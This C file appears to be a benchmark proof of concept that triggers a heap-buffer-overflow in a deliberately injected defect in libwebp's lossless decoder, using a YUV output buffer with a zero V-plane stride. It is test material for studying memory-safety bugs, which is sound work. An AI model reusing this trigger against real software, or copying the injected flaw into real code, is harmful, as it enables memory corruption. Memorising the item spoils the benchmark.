// Benchmark proof-of-concept for an injected memory-safety defect in
// libwebp's lossless decoder (src/dec/vp8l_dec.c EmitRowsYUVA +
// src/dec/buffer_dec.c CheckDecBuffer).
//
// Drives only the public API (webp/encode.h, webp/decode.h) with in-contract
// input: a normal small lossless WebP image, decoded into a caller-owned
// (external) MODE_YUV output buffer whose V-plane stride is left at 0 (a
// value CheckDecBuffer is supposed to accept as "inherit u_stride" per the
// buffer contract exposed by WebPYUVABuffer).
//
// On the vulnerable tree, CheckDecBuffer validates the V plane as if it
// only needs to hold a single row (since v_stride == 0 collapses the size
// formula to uv_width), while the decoder's row emitter actually walks the
// V plane using u_stride once v_stride is 0. That mismatch makes the
// decoder write past the end of the caller's (intentionally minimal) V
// buffer, which AddressSanitizer catches as a heap-buffer-overflow.
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "webp/decode.h"
#include "webp/encode.h"

#define WIDTH 32
#define HEIGHT 32

int main(void) {
  int x, y;
  uint8_t* webp_data = NULL;
  size_t webp_size;
  WebPDecoderConfig config;
  WebPYUVABuffer* buf;
  int uv_width, uv_height;
  uint8_t* y_plane;
  uint8_t* u_plane;
  uint8_t* v_plane;
  VP8StatusCode status;

  // Build a small, ordinary RGBA source image and encode it losslessly.
  uint8_t* rgba = (uint8_t*)malloc((size_t)WIDTH * HEIGHT * 4);
  if (rgba == NULL) return 1;
  for (y = 0; y < HEIGHT; ++y) {
    for (x = 0; x < WIDTH; ++x) {
      uint8_t* p = rgba + (size_t)(y * WIDTH + x) * 4;
      p[0] = (uint8_t)(x * 7 + y * 3);
      p[1] = (uint8_t)(x * 5 + y * 11);
      p[2] = (uint8_t)(x * 13 + y);
      p[3] = 255;
    }
  }

  webp_size = WebPEncodeLosslessRGBA(rgba, WIDTH, HEIGHT, WIDTH * 4,
                                     &webp_data);
  free(rgba);
  if (webp_size == 0 || webp_data == NULL) return 1;

  if (!WebPInitDecoderConfig(&config)) {
    WebPFree(webp_data);
    return 1;
  }

  // Ask for planar YUV output (no alpha plane) into caller-owned buffers.
  config.output.colorspace = MODE_YUV;
  config.output.is_external_memory = 1;

  uv_width = (WIDTH + 1) / 2;
  uv_height = (HEIGHT + 1) / 2;

  // Y and U planes use ordinary, tightly-packed strides.
  y_plane = (uint8_t*)malloc((size_t)WIDTH * HEIGHT);
  u_plane = (uint8_t*)malloc((size_t)uv_width * uv_height);
  // V plane: allocate only a single row's worth of storage, matching the
  // "v_stride == 0 means a single shared row" contract that CheckDecBuffer
  // accepts for an external MODE_YUV buffer.
  v_plane = (uint8_t*)malloc((size_t)uv_width);
  if (y_plane == NULL || u_plane == NULL || v_plane == NULL) {
    WebPFree(webp_data);
    return 1;
  }

  buf = &config.output.u.YUVA;
  buf->y = y_plane;
  buf->y_stride = WIDTH;
  buf->y_size = (size_t)WIDTH * HEIGHT;

  buf->u = u_plane;
  buf->u_stride = uv_width;
  buf->u_size = (size_t)uv_width * uv_height;

  buf->v = v_plane;
  buf->v_stride = 0;          // in-contract sentinel: "inherit u_stride"
  buf->v_size = (size_t)uv_width;  // sized for exactly one row

  status = WebPDecode(webp_data, webp_size, &config);

  WebPFree(webp_data);
  free(y_plane);
  free(u_plane);
  free(v_plane);

  return (status == VP8_STATUS_OK) ? 0 : 1;
}